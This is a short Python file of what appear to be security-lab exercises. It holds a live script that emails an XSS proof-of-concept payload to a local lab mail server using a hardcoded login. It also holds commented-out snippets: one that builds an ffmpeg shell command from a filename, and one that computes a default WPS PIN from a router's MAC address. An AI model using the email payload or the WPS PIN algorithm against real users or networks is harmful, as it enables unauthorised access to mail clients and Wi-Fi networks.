# 2.0 example
import smtplib


email_to = "user@hack.local"
email_from = "hacker@hack.local"

email = 'From: %s\n' % email_from
email += 'To: %s\n' % email_to
email += 'Subject: XSS\n'
email += 'Content-type: text/html\n\n'
email += '<script>alert("Whats up, man!")</script>'

s = smtplib.SMTP('192.168.58.140', 25)
s.login(email_to, "user")
s.sendmail(email_from, email_to, email)
s.quit()

# 3.0 example
# import subprocess
#
#
# def transcode_file():
#     filename = 'text.txt'
#     command = 'ffmpeg -i "{source}" output_file.mpg'.format(source=filename)
#     subprocess.call(command, shell=False)

# 1.0 example
# from math import floor
#
#
# MAC = "C46E1F6A8D04"
#
# one = two = (int(MAC, 16) & 0xFFFFFF) % 10000000
# var1 = 0
#
# while two:
#     var1 += 3 * (two % 10)
#     two = floor(two / 10)
#     var1 += two % 10
#     two = floor(two / 10)
#
# var2 = (one * 10) + ((10 - (var1 % 10)) % 10)
# var3 = str(int(var2))
# result = var3.zfill(8)
# print(result)
